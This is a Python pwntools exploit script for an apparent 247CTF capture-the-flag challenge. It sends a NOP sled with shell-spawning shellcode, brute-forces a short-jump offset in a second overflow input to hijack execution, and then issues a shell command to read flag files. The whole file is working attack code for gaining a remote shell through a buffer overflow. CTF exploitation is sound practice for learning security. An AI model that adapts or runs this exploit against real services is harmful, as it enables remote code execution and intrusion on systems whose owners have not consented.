#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.log_level = 'warn'

HOST = 'f7a5ee299a54c9f1.247ctf.com'
PORT = 50430

shellcode = asm(shellcraft.sh())
first_input = b'\x90' * 15 + shellcode  # Larger NOP sled
first_input = first_input[:50].ljust(50, b'\x90')

# Try different jump offsets
for offset in range(0x50, 0xD0, 4):
    try:
        print(f"[*] Trying offset: 0x{offset:02x}")
        
        p = remote(HOST, PORT, level='error')
        p.recvuntil(b"first name?\n", timeout=2)
        p.send(first_input)
        
        p.recvuntil(b"surname?\n", timeout=2)
        
        # Build payload with this offset
        jump_byte = (256 - offset) & 0xff
        second_input  = b'\x90' * 8
        second_input += p64(0x400738)
        second_input += bytes([0xeb, jump_byte])  # jmp with this offset
        second_input += b'\x90' * 6
        second_input += p32(0x40072e)
        
        p.send(second_input)
        
        # Try to get output
        time.sleep(0.3)
        p.sendline(b'cat flag.txt flag /flag* 2>/dev/null; echo PWNED')
        
        try:
            result = p.recvall(timeout=1)
            if b'PWNED' in result or b'247CTF{' in result or b'flag{' in result:
                print(f"[+] SUCCESS with offset 0x{offset:02x}!")
                print(result.decode('latin1', errors='ignore'))
                p.close()
                break
        except:
            pass
            
        p.close()
        
    except Exception as e:
        continue

print("[*] Done")
